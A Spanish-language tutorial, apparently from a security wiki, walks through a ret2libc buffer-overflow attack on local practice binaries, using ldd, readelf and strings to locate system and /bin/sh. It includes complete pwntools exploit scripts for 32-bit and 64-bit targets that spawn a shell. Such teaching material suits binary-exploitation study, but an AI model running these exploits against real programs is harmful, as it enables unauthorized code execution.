---
description: exploit básico de Return-Oriented Programming
---

# ATAQUE RET2LIBC

{% content-ref url="../../teoria/return-oriented-programming/" %}
[return-oriented-programming](../../teoria/return-oriented-programming/)
{% endcontent-ref %}

Un ataque de ret2libc está basado en la función system que podemos encontrar dentro de la librería libc. Ésta función ejecuta todo lo que se le pasa como argumento, convirtiéndose en un objetivo perfecto.&#x20;

Otra cosa que se encuentra en el interior de libc es la cadena /bin/sh. Si se le pasa ésta cadena a system como parámetro, obtenemos una shell.

## EXPLOTACIÓN MANUAL

### Encontrar dirección base de libc

Afortunadamente Linux posee un comando llamado **`ldd`** para binarios lincados dinámicamente. Si lo ejecutamos en nuestro archivo ELF, nos dirá qué librerías utiliza y sus direcciones base.

```nasm
$ ldd vuln-32 
	linux-gate.so.1 (0xf7fd2000)
	libc.so.6 => /lib32/libc.so.6 (0xf7dc2000)
	/lib/ld-linux.so.2 (0xf7fd3000)
```

Necesitamos `libc.so.6` por lo que la dirección base será `0xf7dc2000`.

### Encontrar el offset de system

Para llamar a system, necesitamos su localización en memoria. Para ello podemos utilizar el comando readelf:

```bash
$ readelf -s /lib32/libc.so.6 | grep system

1534: 00044f00    55 FUNC    WEAK   DEFAULT   14 system@@GLIBC_2.0
```

La flag `-s` le dice a readelf que busque símbolos, por ejemplo, funciones. Aquí podemos ver que el **offset** de **system en libc** es `0x44f00`.

### Encontrar el offset de /bin/sh

Puesto que /bin/sh es una string, podemos utilizar el comando strings en la libreria dinámica que encontramos antes en ldd.&#x20;

{% hint style="info" %}
Tenga en cuenta que si se pasan cadenas de caracteres como parámetros, se deben pasar como punteros a la cadena y no los bytes en si.
{% endhint %}

```nasm
$ strings -a -t x /lib32/libc.so.6 | grep /bin/sh
18c32b /bin/sh
```

`-a` le dice al comando que examine todo el archivo y `-t x` que presente el offset en formato hexadecimal.

El offset de /bin/sh en libc es `0x18c32b`

### Exploit en 32-bit

```python
from pwn import *

p = process('./vuln-32')

libc_base = 0xf7dc2000
system = libc_base + 0x44f00
binsh = libc_base + 0x18c32b

payload = b'A' * 76         # The padding
payload += p32(system)      # Location of system
payload += p32(0x0)         # return pointer - not important once we get the shell
payload += p32(binsh)       # pointer to command: /bin/sh

p.clean()
p.sendline(payload)
p.interactive()
```

### Exploit en 64-bit

Es necesario repetir el proceso con la libreria lincada al binario x64 que se llamará algo parecido a `/lib/x86_64-linux-gnu/libc.so.6.`

{% hint style="info" %}
Tenga en cuenta que al ser 64 bit, es necesario pasar el parámetro utilizando un gadget del tipo `pop rdi; ret`.
{% endhint %}

```bash
$ ROPgadget --binary vuln-64 | grep rdi

[...]
0x00000000004011cb : pop rdi ; ret
```

```python
from pwn import *

p = process('./vuln-64')

libc_base = 0x7ffff7de5000
system = libc_base + 0x48e20
binsh = libc_base + 0x18a143

POP_RDI = 0x4011cb

payload = b'A' * 72         # The padding
payload += p64(POP_RDI)     # gadget -> pop rdi; ret
payload += p64(binsh)       # pointer to command: /bin/sh
payload += p64(system)      # Location of system
payload += p64(0x0)         # return pointer - not important once we get the shell

p.clean()
p.sendline(payload)
p.interactive()
```

## AUTOMATIZANDO CON PWNTOOLS

```python
# 32-bit
from pwn import *

elf = context.binary = ELF('./vuln-32')
p = process()

libc = elf.libc                        # Simply grab the libc it's running with
libc.address = 0xf7dc2000              # Set base address

system = libc.sym['system']            # Grab location of system
binsh = next(libc.search(b'/bin/sh'))  # grab string location

payload = b'A' * 76         # The padding
payload += p32(system)      # Location of system
payload += p32(0x0)         # return pointer - not important once we get the shell
payload += p32(binsh)       # pointer to command: /bin/sh

p.clean()
p.sendline(payload)
p.interactive()
```

{% hint style="success" %}
El de 64 bits es practicamente igual
{% endhint %}

{% hint style="info" %}
Se puede simplificar aún más utilizando las capacidades de ROP de PWNTools
{% endhint %}
